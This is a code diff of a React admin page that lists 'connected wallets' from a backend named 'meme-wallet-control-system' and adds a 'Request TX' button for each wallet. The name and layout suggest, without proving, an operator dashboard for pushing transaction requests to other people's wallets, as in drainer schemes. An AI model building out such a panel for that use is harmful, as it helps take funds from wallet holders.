@@ -1,55 +1,77 @@
-import React, { useState, useEffect } from "react";
-import { Link } from "react-router-dom";
+import React, { useEffect, useState } from "react";
+import { useNavigate } from "react-router-dom";
 
-export default function Wallets() {
+function Wallets() {
   const [wallets, setWallets] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const navigate = useNavigate();
+
+  const backend = "https://meme-wallet-control-system-hx1r.vercel.app";
 
   useEffect(() => {
-    load();
+    fetch(backend + "/api/admin-get-wallets")
+      .then((res) => res.json())
+      .then((data) => {
+        setWallets(data.wallets || []);
+        setLoading(false);
+      })
+      .catch(() => setLoading(false));
   }, []);
 
-  const load = async () => {
-    const res = await fetch(
-      "https://meme-wallet-control-system-hx1r.vercel.app/api/admin-get-wallets"
-    );
-    const data = await res.json();
-    if (data.success) setWallets(data.wallets);
+  const openSendRequest = (walletAddress) => {
+    navigate("/send-request", { state: { walletAddress } });
   };
 
   return (
-    <div className="page">
-      <h1>Connected Wallets</h1>
+    <div>
+      <h2>Connected Wallets</h2>
 
-      <table className="table">
-        <thead>
-          <tr>
-            <th>Wallet Address</th>
-            <th>Chain</th>
-            <th>Wallet Name</th>
-            <th>Connected At</th>
-            <th></th>
-          </tr>
-        </thead>
-
-        <tbody>
-          {wallets.map((w) => (
-            <tr key={w.address}>
-              <td>{w.address}</td>
-              <td>{w.chain}</td>
-              <td>{w.walletName}</td>
-              <td>{w.time}</td>
-              <td>
-                <Link
-                  to={`/send-request?wallet=${w.address}&chain=${w.chain}`}
-                  className="btn btn-primary"
-                >
-                  Send Request →
-                </Link>
-              </td>
+      {loading ? (
+        <p>Loading wallets...</p>
+      ) : (
+        <table className="table">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Wallet Address</th>
+              <th>Chain</th>
+              <th>Wallet Name</th>
+              <th>Time</th>
+              <th>Send Request</th>
             </tr>
-          ))}
-        </tbody>
-      </table>
+          </thead>
+
+          <tbody>
+            {wallets.map((w, i) => (
+              <tr key={w.id}>
+                <td>{i + 1}</td>
+                <td>{w.address}</td>
+                <td>{w.chain}</td>
+                <td>{w.walletName}</td>
+                <td>{w.time}</td>
+                <td>
+                  <button
+                    className="btn-small"
+                    onClick={() => openSendRequest(w.address)}
+                  >
+                    Request TX
+                  </button>
+                </td>
+              </tr>
+            ))}
+
+            {wallets.length === 0 && (
+              <tr>
+                <td colSpan="6" style={{ textAlign: "center" }}>
+                  No wallets found
+                </td>
+              </tr>
+            )}
+          </tbody>
+        </table>
+      )}
     </div>
   );
 }
+
+export default Wallets;
